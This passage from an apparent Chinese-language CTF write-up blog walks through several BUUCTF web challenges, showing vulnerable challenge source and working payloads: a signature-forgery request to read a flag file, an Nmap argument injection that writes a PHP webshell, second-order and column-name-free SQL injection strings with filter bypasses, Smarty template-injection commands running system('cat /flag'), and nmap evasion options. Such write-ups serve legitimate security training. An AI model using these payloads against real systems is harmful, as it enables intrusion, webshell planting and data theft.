class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span> <span class="comment">#初始化类，返回的类型是function</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># SandBox For Remote_Addr os.mkdir(self.sandbox)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">                <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line">            <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#GET方式接受 param参数值</span></span><br><span class="line"><span class="comment">#令action = &quot;scan&quot;</span></span><br><span class="line"><span class="comment">#同时将action和param，返回到 getSign()函数  生成一段签名</span></span><br><span class="line"><span class="comment">#urllib.unquote()字符串被当作url提交时会被自动进行url编码处理</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#以GET方法接受 接受 param 参数</span></span><br><span class="line"><span class="comment">#cookie接收 sign 和 action</span></span><br><span class="line"><span class="comment">#使用 waf函数进行判断 我们传入的参数中是否含有 gopher 和 file 着两个敏感词汇</span></span><br><span class="line"><span class="comment">#将action, param, sign, ip 四个参数转到tast函数中，</span></span><br><span class="line"><span class="comment">#将我们在tast.Exec()转变为 json的格式，</span></span><br><span class="line"><span class="comment">#从而实现我们进行读取的目的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##tast函数中，先初始化类  之后进行一个签名的判断</span></span><br><span class="line"><span class="comment">#调用getSign()函数 与我们输入的签名进行对比</span></span><br><span class="line"><span class="comment">#相同，继续进行判断</span></span><br><span class="line"><span class="comment">#若&quot;scan&quot; in self.action:则将读取到的内容写入result.txt;</span></span><br><span class="line"><span class="comment">#若&quot;read&quot; in self.action:则将result.txt的内容显示出来</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)  <span class="comment">#从url上下载图片</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span>   <span class="comment"># 获得签名  函数</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#对secert_key + param + action进行MD5加密，同时利用hexdigest() 函数将加密后的MD5字符串转化为十六进制数据字符串值    #获得的字符串就是 cookie需要的Sign</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span><span class="comment">#判断我们传入的文件是否含有以gopher或者file开头 </span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

payload：
本关的是要签名的判断
我们可以利用前面 route"/geneSign"来生成我们需要的sign
同时我们要让cookie中含有 scan 和 read 以便后续对flag的文件进行读取
scan的话，在geneSign函数里面,action是等于scan，而getsign函数将param和action拼接起来，所以我们无需将scan加入到我们所需要查询文件的后面，仅仅只需要将read添加到后面即可

同时，本题提示我们flag is in ./flag.txt

创建 sign

`/geneSign?param=flag.txtread`![image-20220517151052378](./buu/image-20220517151052378.png)

访问 flag文件

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/De1ta?param=flag.txt</span><br><span class="line"></span><br><span class="line">Cookie:action=readscan;sign=fa25db02c88ac47093e53f1114a81475</span><br></pre></td></tr></table></figure>

![image-20220517151729782](./buu/image-20220517151729782.png)

## [哈希长度拓展攻击]([Hash Length Extension Attack](https://joychou.org/web/hash-length-extension-attack.html#directory092413593576057416))

利用的话就是利用hashpump工具：
 [HashPump](https://github.com/bwall/HashPump)

## [网鼎杯 2020 朱雀组]Nmap

![image-20220517154855716](./buu/image-20220517154855716.png)

nmap这款工具是用来扫描网络的，一般会拿来扫目标主机的端口或操作系统之类的，之前有用过，他有很多的命令可以使用，但之前没有刻意去研究。

估计这题的后台就是用了一条简单的拼接语句，类似于："nmap".$cmd，之类的。

先抓个包看一下运行流程，首先index.php用了POST传参传过去一个host参数，然后本地又发起了一个GET请求，传了一个参数f=90131，通过修改此参数，发现PHP报错 simplexml_load_file(): I/O warning : failed to load external entity  "xml/90132" in **/var/www/html/result.php** on line **23**

![image-20220517155315696](./buu/image-20220517155315696.png)

![image-20220517155747902](./buu/image-20220517155747902.png)

simplexml_load_file() 函数是把 XML 文档载入对象中，所以初步猜想，应该是nmap将扫描的结果保存为了xml文档，然后PHP再打开该文档解析，后台命令可能为nmap -oX 127.0.0.1 ./xml/????

这里就需要稍微了解一下nmap的指令了，稍微在网上收集了一些常用命令，以便后面查阅：

<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -v <span class="number">127.0</span>.<span class="number">0.1</span>							给出了远程机器更详细的信息，显示冗余信息(扫描细节)</span><br><span class="line"><span class="keyword">nmap</span> -iL nmaptest.txt 						运行带“iL” 选项的<span class="keyword">nmap</span>命令来扫描文件中列出的所有IP地址</span><br><span class="line"><span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0</span>.* --exclude <span class="number">192.168</span>.<span class="number">0.100</span>	使用“-exclude”选项来排除某些你不想要扫描的主机</span><br><span class="line"><span class="keyword">nmap</span> -A <span class="number">192.168</span>.<span class="number">0.101</span>						启用操作系统和版本检测，脚本扫描和路由跟踪功能</span><br><span class="line"><span class="keyword">nmap</span> -O <span class="number">127.0</span>.<span class="number">0.1</span>							使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息</span><br><span class="line"><span class="keyword">nmap</span> -sA <span class="number">192.168</span>.<span class="number">0.101</span>						扫描远程主机以探测该主机是否使用了包过滤器或防火墙</span><br><span class="line"><span class="keyword">nmap</span> -PN <span class="number">192.168</span>.<span class="number">0.101</span>						扫描主机检测其是否受到数据包过滤软件或防火墙的保护</span><br><span class="line"><span class="keyword">nmap</span> -sP <span class="number">192.168</span>.<span class="number">0</span>.*						找出网络中的在线主机</span><br><span class="line"><span class="keyword">nmap</span> -F <span class="number">192.168</span>.<span class="number">0.101</span>						快速扫描，仅扫描<span class="keyword">nmap</span>-services文件中的端口而避开所有其它的端口</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">f</span> <span class="number">192.168</span>.<span class="number">96.4</span>						使用小数据包发送，避免被识别出</span><br><span class="line"><span class="keyword">nmap</span> -r <span class="number">192.168</span>.<span class="number">0.101</span>						不会随机的选择端口扫描</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span>.<span class="number">0.101</span>				使用“-<span class="keyword">P</span>”选项指定你想要扫描的端口</span><br><span class="line"><span class="keyword">nmap</span> -sV <span class="number">192.168</span>.<span class="number">0.101</span>						查找主机服务版本号</span><br><span class="line"><span class="keyword">nmap</span> -PS <span class="number">192.168</span>.<span class="number">0.101</span>						使用TCP ACK和TCP Syn方法来扫描远程主机（防火墙会阻断标ICMP包）</span><br><span class="line"><span class="keyword">nmap</span> -Pn <span class="number">192.168</span>.<span class="number">96.4</span>					  	目标机禁用ping，绕过ping扫描</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">sn</span> <span class="number">192.168</span>.<span class="number">96.4</span>						对目标进行ping检测，不进行端口扫描（发送四种报文确定目标是否存活）</span><br><span class="line"><span class="keyword">nmap</span> -sS <span class="number">192.168</span>.<span class="number">0.101</span>						执行一次隐蔽的扫描，安全，快</span><br><span class="line"><span class="keyword">nmap</span> -sT <span class="number">192.168</span>.<span class="number">0.101</span>						使用TCP Syn扫描最常用的端口，不安全，慢</span><br><span class="line"><span class="keyword">nmap</span> -<span class="keyword">sN</span> <span class="number">192.168</span>.<span class="number">0.101</span>						执行TCP空扫描以骗过防火墙</span><br><span class="line"><span class="keyword">nmap</span> -sI 僵尸ip 目标ip						使用僵尸机对目标机发送数据包</span><br><span class="line"><span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">96.4</span> -oX myscan.xml			对扫描结果另存在myscan.xml</span><br><span class="line"><span class="keyword">nmap</span> -T1~<span class="number">6</span> <span class="number">192.168</span>.<span class="number">96.4</span>						设置扫描速度，一般T4足够</span><br><span class="line"><span class="keyword">nmap</span> –mtu <span class="symbol">&lt;size&gt;</span> <span class="number">192.168</span>.<span class="number">96.4</span>				发送的包大小,最大传输单元必须是<span class="number">8</span>的整数</span><br><span class="line"><span class="keyword">nmap</span> -D &lt;假ip&gt; <span class="number">192.168</span>.<span class="number">96.4</span>					发送参杂着假ip的数据包检测</span><br><span class="line">继续中断扫描：</span><br><span class="line">	<span class="keyword">nmap</span> –oG <span class="number">1</span>.txt –v <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span>			-oG将扫描结果保存为TXT，Ctrl+C中断扫描</span><br><span class="line">	Nmap –resume <span class="number">1</span>.txt							作用：继续扫描</span><br><span class="line"></span><br></pre></td></tr></table></figure>

nmap可以将扫描后的结果保存为文件，这个文件格式甚至可以自己决定

把nmap保存文件的一些方法截下来：

![image-20220517155034102](./buu/image-20220517155034102.png)

文件的后缀可以自己决定，文件内容里还包含了我们输入的查询内容。

回到题目，之前我们猜测了nmap 127.0.0.1 -oX ./xml/????

![image-20220517160316983](./buu/image-20220517160316983.png)

其中127.0.0.1是我们控制的，那我们尝试改成

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.php&#x27;</span><br></pre></td></tr></table></figure>

测试后发现被拦截了，可能是PHP关键字被拦截了，也可能是oG被禁用了，先试着绕php，后缀可以将php改成phtml

文件的内容<?php中的PHP如何替换上网去查了一下，解决方法是使用短标签<?=

最终payload：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?= @eval($_POST[&quot;pwd&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table>

如何最后就是去注入写文件，蚁剑连接，读flag，交flag，结束。

## [SWPU2019]Web1

知识点：二次注入,无列名注入,bypass information_ schema

二次注入漏洞在CTF中常见于留言板和注册登录功能,简单来说可以分为两个步骤:

1. 插入恶意数据(发布帖子,注册账号),用mysql_escape_string()函数对恶意字符进行转义,但是再将数据写入数据库中的时候又保留了原来的数据.
2. 引用插入的恶意数据:在进行查询时,直接从数据库中引用恶意数据,没有做进一步过滤和检验.

bypass information_ schema

1. information_schema这个数据库存放着其他数据库的信息,包括表名,字段名等.在常规注入过程中利用information_schema就是想要获取到其中的信息.
2. mysql在5.7版本中新增了sys.schema:
   1. `sys.schema_auto_increment_columns #该视图的作用是对表自增ID进行监控`就是说,某张表如果存在自增ID,我们就可以通过该视图获取数据库的该表名信息.
   2. 如果该表没有自增主键呢?->`sys.schema_table_statistics_with_buffer`
   3. payload(环境:sqli-labs Less1):
      1. `?id=-1‘ union select 1,(select group_concat(table_name) from  sys.schema_auto_increment_columns where table_schema=database()),3 --+`
      2. `?id=-1‘ union select 1,(select group_concat(table_name) from  sys.schema_table_statistics_with_buffer where table_schema=database()),3 --+`
   4. 限制条件:
      1. mysql version>=5.7
      2. 要求权限高,一般root用户才可以访问

无列名注入

如果information_schema被WAF,得到表名之后使用无列名注入技巧获取字段值，之后就可以利用数字来对应相应的列,进行查询

1. 列名需要用``包裹起来
2. 使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)
3. 如果反引号``被过滤,可以使用为字段起别名的方式.

解题：

**1)留言板二次注入：我们申请广告的时候数据库将我们输入的恶意字符进行转义，但是写入数据库的时候会将数据还原。当点击查看广告详情的时候数据库对查询到的结果并未严格过滤，导致了二次注入。**
**2)题目过滤了空格，or，注释符号，导致了order by,information_schema都被WAF.绕过姿势:空格用内联注释绕过，or用异或^绕过，最后考虑闭合单引号的问题。**
**3)这道题目在buuoj上的复现是没办法用sys.schema来bypass  information_schema的，原因是buuoj没有sys.schema_table_statistics_with_buffer这个数据库，但是比赛中是可以利用的，所以还是要作为一个技巧来积累。**这里可以通过mysql.innodb_table_stats来进行获取表名

1. 开头的注册登录只是幌子,注册账号,进入留言板.
2. 发现注入点:

3. 猜解字段数：`-1'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,22'`

因为过滤了‘or‘导致order by无法使用，得用到联合查询一个个试

点击广告详情得到：![image-20220519150719110](./buu/image-20220519150719110.png)

然后去爆数据库:

`1'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

![image-20220519151021213](./buu/image-20220519151021213.png)

爆表名，这里不能使用or，所以这里使用的是新的payload

`1'/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name="web1"'`

![image-20220519151119552](./buu/image-20220519151119552.png)

去爆users的字段

`1'/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

![image-20220519151321213](./buu/image-20220519151321213.png)

在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。

无列名注入原理：

类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。

**不使用表名查询**

正常的 sql 查询如下：

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span>;</span><br></pre></td></tr></table></figure>

![image-20220519152114463](./buu/image-20220519152114463.png)

其中，列名为 id、name、password，使用 union 查询：

<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>;</span><br></pre></td></tr></table></figure>

![image-20220519152150115](./buu/image-20220519152150115.png)

如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure>

![image-20220519152240732](./buu/image-20220519152240732.png)

末尾的 a 可以是任意字符，用于命名。

当然，多数情况下，`` `会被过滤。当 ` 不能使用的时候，使用别名来代替：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from admin)a;</span><br></pre></td></tr></table></figure>

同时查询多个列：

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br></pre></td></tr></table></figure>

简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。

## [CISCN2019 华东南赛区]Web11

![image-20220521112140043](./buu/image-20220521112140043.png)

![image-20220521112906839](./buu/image-20220521112906839.png)

![image-20220521112745960](./buu/image-20220521112745960.png)

根据下面的三张图提示，可以看出是`smart ssti`，在`XFF`处构造payload，在做题前先了解一下啥是smart。

smart是php的模板引擎，模板引擎的作用就是分离前端页面和数据的，题目中显示API的URL由于环境的原因无法使用，但我们的IP依旧显示在了页面的右上角，且根据它的提示XFF我们很容易想到，在X-Forwarded-For里构造ssti：payload

![image-20220521112933064](./buu/image-20220521112933064.png)

![image-20220521113103030](./buu/image-20220521113103030.png)

Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，那么我们可以使用&#123;php&#125;&#123;/php&#125;标签来构造payload，但是本题会报错
 ![image-20220521113239636](./buu/image-20220521113239636.png)

因为现在的smart已经不用此标签了。
 可以用`&#123;$smarty.version&#125;`来看一下版本

![image-20220521113322909](./buu/image-20220521113322909.png)

虽然php标签不能用，但是还有个&#123;if&#125;标签。
Smarty的&#123;if&#125;条件判断和PHP的if 非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;. 也可以使用&#123;else&#125; 和 &#123;elseif&#125;. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&&,and,is_array(), 等等

既然全部的PHP条件表达式和函数都可以在if内使用,那我们在里面写php代码也行。
&#123;if phpinfo()&#125;&#123;/if&#125;
&#123;if system('cat /flag')&#125;&#123;/if&#125;

![image-20220521114228136](buu/image-20220521114228136.png)

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">我们通过一串代码来了解一下，它的漏洞为什么会产生。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line"><span class="comment">//获取XFF</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line"><span class="comment">//此处并不是以smart模板格式，而是以字符串形式，所以会解析我们的标签，也就是if,解析后把内容回显到页面上的相应位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [SUCTF 2019]Pythonginx

![image-20220528133730959](./buu/image-20220528133730959.png)

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">        </span><br><span class="line"><span class="meta">        @app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure>

`urlsplit`是拆分，而`urlparse`是解析，所以`urlparse`粒度更为细致

